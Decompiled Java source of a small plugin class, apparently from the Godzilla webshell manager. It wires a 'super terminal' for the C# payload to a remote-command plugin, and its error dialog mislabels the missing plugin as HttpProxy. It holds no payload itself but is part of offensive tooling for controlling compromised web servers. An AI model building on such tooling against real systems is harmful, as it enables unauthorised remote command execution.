/*    */ package shells.plugins.cshap;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import shells.plugins.generic.RealCmd;
/*    */ import shells.plugins.generic.SuperTerminal;
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "SuperTerminal", DisplayName = "超级终端")
/*    */ public class CSuperTerminal
/*    */   extends SuperTerminal
/*    */ {
/*    */   public RealCmd getRealCmd() {
/* 14 */     RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
/* 15 */     if (plugin != null) {
/* 16 */       return plugin;
/*    */     }
/* 18 */     GOptionPane.showMessageDialog(getView(), "未找到HttpProxy插件!", "提示", 0);
/*    */     
/* 20 */     return null;
/*    */   }
/*    */ }


/* Location:              /Users/h12/Documents/网安工具/gesila/godzilla.jar!/shells/plugins/cshap/CSuperTerminal.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */